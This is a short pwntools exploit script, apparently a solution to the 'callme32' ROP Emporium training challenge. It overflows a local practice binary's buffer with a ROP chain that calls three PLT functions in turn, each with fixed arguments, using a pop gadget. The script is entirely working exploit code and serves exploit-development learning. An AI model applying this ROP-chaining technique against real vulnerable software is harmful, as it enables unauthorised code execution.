#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./callme32_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616c)
payload = padding

ARGS = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# (r2) iS - to print sections adresses
# (r2) pd @ 0x080484b0 - to print .plt section
CALLME_1_PLT = p32(0x080484f0)
CALLME_2_PLT = p32(0x08048550)
CALLME_3_PLT = p32(0x080484e0)

# ROPgadget --binary ./callme32
POP_ESI_EDI_EBP = p32(0x080487f9)

payload += CALLME_1_PLT + POP_ESI_EDI_EBP + ARGS
payload += CALLME_2_PLT + POP_ESI_EDI_EBP + ARGS
payload += CALLME_3_PLT + p32(0xa5a5a5a5) + ARGS

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
